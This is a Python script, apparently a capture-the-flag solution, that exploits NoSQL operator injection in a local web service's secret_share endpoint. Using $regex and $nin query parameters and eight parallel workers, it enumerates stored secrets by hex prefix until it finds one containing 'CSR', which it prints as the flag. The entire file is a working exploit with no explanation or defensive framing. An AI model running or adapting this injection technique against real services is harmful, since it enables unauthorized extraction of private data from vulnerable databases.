import requests
import hashlib
import re
import multiprocessing as mp


def sha256(s):
    return hashlib.sha256(s.encode()).hexdigest()


def make_req(prefix):
    url = "http://localhost:37585/secret_share?secid[$regex]=^" + prefix
    res = requests.get(url)
    content = re.findall(r"<!-- secret will be placed here -->(.*)<!-- end secret -->", res.text)
    if content:
        return content[0]

def find_same_prefix(prefix, known_hash):
    base_url = "http://localhost:37585/secret_share?secid[$regex]=^" + prefix + "&secid[$nin]=xxx&"
    all_found = False
    known_hashes = [known_hash]
    words = []
    while True:
        url = base_url
        for h in known_hashes:
            url += "&secid[$nin]=" + h + "&"
        res = requests.get(url)
        content = re.findall(r"<!-- secret will be placed here -->(.*)<!-- end secret -->", res.text)
        if res.status_code == 404 or not content:
            return words
        word = content[0]
        words.append(word)
        known_hashes.append(sha256(word))


def worker(wid, in_queue, res_queue):
    print("Worker {:02}: started".format(wid))
    while not in_queue.empty():
        prefix = in_queue.get()
        word = make_req(prefix)
        if word is None:
            continue
        sha256sum = sha256(word)

        print("Worker {:02}: prefix {}".format(wid, prefix))

        if "CSR" in word:
            res_queue.put(word)

        words = find_same_prefix(prefix, sha256sum)

        print("Worker {:02}: found {} hashes with prefix {}".format(wid, len(words), prefix))

        for w in words:
            if "CSR" in w:
                res_queue.put(w)


N_WORKERS = 8
jobs = []
in_q = mp.Queue()
res_q = mp.Queue()

for i in range(2**12):
    in_q.put(hex(i)[2:].rjust(3, "0"))


for i in range(N_WORKERS):
    job = mp.Process(target=worker, args=(i, in_q, res_q))
    job.start()
    jobs.append(job)

print("Flag: ", res_q.get())

for j in jobs:
    j.terminate()
